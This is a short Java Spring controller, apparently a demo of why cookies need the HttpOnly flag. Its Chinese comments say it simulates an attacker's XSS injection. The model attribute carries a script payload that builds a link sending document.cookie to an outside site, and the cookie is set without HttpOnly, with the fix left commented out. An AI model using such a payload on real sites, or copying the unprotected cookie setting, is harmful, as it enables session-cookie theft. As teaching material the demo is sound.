package com.future.demo;

import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletResponse;

@Controller
public class DemoController {
    @RequestMapping("/")
    public String index(Model model, HttpServletResponse response) {
        // 模拟攻击者注入XSS攻击代码
        model.addAttribute("message", "你好！<script>window.onload=function() {var el=document.createElement('a');el.href='https://www.baidu.com?'+document.cookie;el.target='_blank';el.innerHTML='点击我会提交cookie到远程';document.body.appendChild(el);}</script>");
        response.setHeader("set-cookie", "myCookie=mySecretValue;");
        // httponly 防止 js 读取 cookie
        // response.setHeader("set-cookie", "myCookie=mySecretValue; httponly;");
        return "index";
    }
}
